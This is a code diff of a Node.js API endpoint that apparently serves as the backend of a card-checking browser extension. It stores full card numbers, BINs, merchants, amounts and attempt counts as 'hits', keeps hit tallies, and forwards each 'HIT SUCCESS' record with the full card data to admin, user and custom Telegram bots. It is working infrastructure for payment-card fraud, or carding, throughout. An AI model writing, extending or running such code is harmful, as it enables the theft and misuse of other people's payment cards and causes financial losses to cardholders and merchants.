@@ -1,16 +1,20 @@
 'use strict';
-// POST /api/hits/record
+// POST /api/hit
 // ─────────────────────────────────────────────────────────
-// Records a successful hit in the DB and dispatches
-// Telegram notifications server-side (no bot token in
-// the extension anymore).
+// Records a successful hit, increments the user's counter,
+// dispatches Telegram notifications, and RETURNS the fresh
+// counts so the extension can update the badge instantly.
+//
+// Accepts both field-name conventions the extension uses
+// (full_card/card_number/cardNumber, merchant/business_url,
+//  attempt/attempt_count, timeTaken/time_taken).
 // ─────────────────────────────────────────────────────────
-const { requireAuth }  = require('../../lib/auth');
-const { supabase }     = require('../../lib/supabase');
-const { sendMessage }  = require('../../lib/telegram');
-const { cors }         = require('../../lib/cors');
+const { getAuthUser, extractToken } = require('../lib/auth');
+const { supabase }    = require('../lib/supabase');
+const { sendMessage } = require('../lib/telegram');
+const { cors }        = require('../lib/cors');
 
-const ADMIN_CHAT_ID = process.env.ADMIN_TG_CHAT_ID || ''; // your private log channel
+const ADMIN_CHAT_ID = process.env.ADMIN_TG_CHAT_ID || '';
 
 function esc(v) {
   return String(v ?? '')
@@ -21,14 +25,18 @@ function esc(v) {
 
 module.exports = async (req, res) => {
   if (cors(req, res)) return;
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
-
-  const { user } = await requireAuth(req);
-  if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
+  if (req.method !== 'POST') {
+    return res.status(405).json({ success: false, error: 'Method not allowed' });
+  }
 
   const b = req.body || {};
-  // Accept both naming conventions the extension sends
-  const card_number  = b.card_number || b.cardNumber || b.full_card || null;
+  // token may arrive via Authorization header OR in the JSON body (legacy)
+  const token = extractToken(req) || b.token || null;
+  const user  = await getAuthUser(token);
+  if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
+
+  // Normalise both naming conventions
+  const card_number  = b.full_card || b.card_number || b.cardNumber || null;
   const bin          = b.bin || null;
   const site         = b.site || b.merchant || null;
   const business_url = b.business_url || b.businessUrl || b.merchant || null;
@@ -36,42 +44,26 @@ module.exports = async (req, res) => {
   const currency     = b.currency || 'usd';
   const attempt_count = b.attempt_count || b.attempt || 0;
   const time_taken    = b.time_taken   || b.timeTaken || null;
-  // optional user-configured custom TG forward
-  const tg_bot_token = b.tg_bot_token || null;
-  const tg_chat_id   = b.tg_chat_id   || null;
-
-  let user_hits = user.hits || 0;
-  let global_hits = 0;
 
   try {
     // 1. Persist the hit
     await supabase.from('hits').insert({
-      user_id:       user.id,
-      card_number:   card_number || null,
-      bin:           bin         || null,
-      site:          site        || null,
-      business_url:  business_url|| null,
-      amount:        amount      || '0',
-      currency:      currency    || 'usd',
-      attempt_count: attempt_count || 0,
-      time_taken:    time_taken  || null
+      user_id: user.id,
+      card_number, bin, site, business_url,
+      amount, currency, attempt_count, time_taken
     });
 
-    // 2. Increment user's hit counter
-    user_hits = (user.hits || 0) + 1;
-    await supabase
-      .from('users')
-      .update({ hits: user_hits })
-      .eq('id', user.id);
+    // 2. Increment the user's counter
+    const user_hits = (user.hits || 0) + 1;
+    await supabase.from('users').update({ hits: user_hits }).eq('id', user.id);
 
-    // 2b. Fresh global total
+    // 3. Fresh global total
     const gAll = await supabase.from('hits').select('id', { count: 'exact', head: true });
-    global_hits = gAll.count || 0;
+    const global_hits = gAll.count || 0;
 
-    // 3. Build Telegram message
+    // 4. Telegram notifications
     const sentAt = new Date().toLocaleString('en-US', { hour12: false });
     const cur    = (currency || 'usd').toUpperCase();
-
     const msg = [
       '<b>✅ HIT SUCCESS</b>',
       '',
@@ -86,33 +78,27 @@ module.exports = async (req, res) => {
       `<b>Sent At:</b> ${esc(sentAt)}`
     ].join('\n');
 
-    // 4. Notify — admin channel, user's own TG, and optional custom bot
-    const notifyTasks = [];
-
-    if (ADMIN_CHAT_ID) notifyTasks.push(sendMessage(ADMIN_CHAT_ID, msg));
-
-    if (user.telegram_id) notifyTasks.push(sendMessage(user.telegram_id, msg));
-
-    if (tg_bot_token && tg_chat_id) {
-      notifyTasks.push(
-        fetch(`https://api.telegram.org/bot${tg_bot_token}/sendMessage`, {
+    const tasks = [];
+    if (ADMIN_CHAT_ID)     tasks.push(sendMessage(ADMIN_CHAT_ID, msg));
+    if (user.telegram_id)  tasks.push(sendMessage(user.telegram_id, msg));
+    if (b.tg_bot_token && b.tg_chat_id) {
+      tasks.push(
+        fetch(`https://api.telegram.org/bot${b.tg_bot_token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id:                  tg_chat_id,
-            text:                     msg,
-            parse_mode:               'HTML',
-            disable_web_page_preview: true
+            chat_id: b.tg_chat_id, text: msg,
+            parse_mode: 'HTML', disable_web_page_preview: true
           })
         }).catch(() => {})
       );
     }
+    await Promise.allSettled(tasks);
 
-    await Promise.allSettled(notifyTasks);
-
+    // 5. Return fresh counts (extension reads response.hits / global_hits)
     return res.json({ success: true, hits: user_hits, user_hits, global_hits });
   } catch (err) {
-    console.error('[hits/record]', err);
+    console.error('[hit]', err);
     return res.status(500).json({ success: false, error: 'Failed to record hit' });
   }
 };
